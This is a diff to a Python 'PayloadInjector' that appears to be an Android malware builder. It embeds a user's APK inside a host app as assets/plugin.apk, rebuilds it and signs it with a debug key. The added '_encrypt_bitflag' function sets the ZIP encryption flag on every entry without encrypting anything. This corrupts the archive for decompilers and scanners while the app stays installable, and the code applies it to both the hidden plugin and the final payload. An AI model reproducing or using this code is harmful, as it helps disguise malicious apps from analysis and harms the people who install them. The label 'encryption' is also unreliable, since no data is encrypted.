@@ -4,6 +4,7 @@ import shutil
 import asyncio
 import logging
 import subprocess
+import struct
 from pathlib import Path
 from .config import APKTOOL_PATH, ZIPALIGN_PATH, APKSIGNER_PATH, DEBUG_KEYSTORE_PATHS, DEBUG_KEYSTORE_PASSWORD, DEBUG_KEYSTORE_ALIAS
 from .apk_analyzer import APKAnalyzer
@@ -152,7 +153,7 @@ class PayloadInjector:
             return None
     
     async def _inject_plugin_apk(self, user_apk_path):
-        """Replace assets/plugin.apk with user APK"""
+        """Replace assets/plugin.apk with user APK (with BitFlag encryption)"""
         try:
             plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')
             
@@ -161,8 +162,15 @@ class PayloadInjector:
                 os.remove(plugin_path)
                 logger.debug("Removed old plugin.apk")
             
-            # Copy user APK
-            shutil.copy2(user_apk_path, plugin_path)
+            # Encrypt user APK before injection
+            logger.info("🔐 Encrypting user APK (BitFlag)...")
+            encrypted_apk = await self._encrypt_bitflag(user_apk_path, plugin_path)
+            
+            if not encrypted_apk:
+                # Fallback: copy without encryption
+                logger.warning("Encryption failed, copying without BitFlag")
+                shutil.copy2(user_apk_path, plugin_path)
+            
             logger.info("✅ User APK injected as plugin.apk")
             
             return True
@@ -232,6 +240,7 @@ class PayloadInjector:
         """Rebuild and sign the modified payload"""
         try:
             unsigned_apk = os.path.join(self.work_dir, 'unsigned.apk')
+            encrypted_apk = os.path.join(self.work_dir, 'encrypted.apk')
             aligned_apk = os.path.join(self.work_dir, 'aligned.apk')
             
             # Rebuild
@@ -252,9 +261,17 @@ class PayloadInjector:
             
             logger.info("✅ APK built")
             
+            # Encrypt with BitFlag
+            logger.info("🔐 Encrypting payload (BitFlag)...")
+            if not await self._encrypt_bitflag(unsigned_apk, encrypted_apk):
+                logger.warning("Encryption failed, continuing without BitFlag")
+                encrypted_apk = unsigned_apk
+            else:
+                logger.info("✅ Payload encrypted")
+            
             # Zipalign
             logger.info("Running zipalign...")
-            if not await self._zipalign(unsigned_apk, aligned_apk):
+            if not await self._zipalign(encrypted_apk, aligned_apk):
                 return None
             
             # Sign with debug keystore
@@ -323,6 +340,58 @@ class PayloadInjector:
         except Exception as e:
             logger.error(f"Signing error: {str(e)}")
             return None
+    
+    async def _encrypt_bitflag(self, input_apk, output_apk):
+        """Apply BitFlag encryption to APK"""
+        try:
+            with open(input_apk, 'rb') as f:
+                data = f.read()
+            
+            # Find EOCD
+            eocd_sig = b'\x50\x4B\x05\x06'
+            eocd_offset = data.rfind(eocd_sig)
+            if eocd_offset == -1:
+                logger.error("EOCD not found")
+                return False
+            
+            # Get Central Directory info
+            cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
+            cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]
+            
+            pos = cd_offset
+            modified = bytearray(data)
+            count = 0
+            
+            # Process all entries and set BitFlag
+            while pos < cd_offset + cd_size:
+                if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
+                    break
+                
+                # Set encryption flag
+                bitflag_offset = pos + 8
+                bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]
+                
+                if not (bitflag & 0x0001):
+                    bitflag |= 0x0001  # Set bit 0
+                    struct.pack_into('<H', modified, bitflag_offset, bitflag)
+                    count += 1
+                
+                # Move to next entry
+                name_len = struct.unpack_from('<H', data, pos + 28)[0]
+                extra_len = struct.unpack_from('<H', data, pos + 30)[0]
+                comment_len = struct.unpack_from('<H', data, pos + 32)[0]
+                pos += 46 + name_len + extra_len + comment_len
+            
+            # Write encrypted APK
+            with open(output_apk, 'wb') as f:
+                f.write(modified)
+            
+            logger.info(f"✅ BitFlag set on {count} entries")
+            return True
+            
+        except Exception as e:
+            logger.error(f"BitFlag encryption error: {str(e)}")
+            return False
     
     async def _cleanup(self):
         """Cleanup temporary files"""
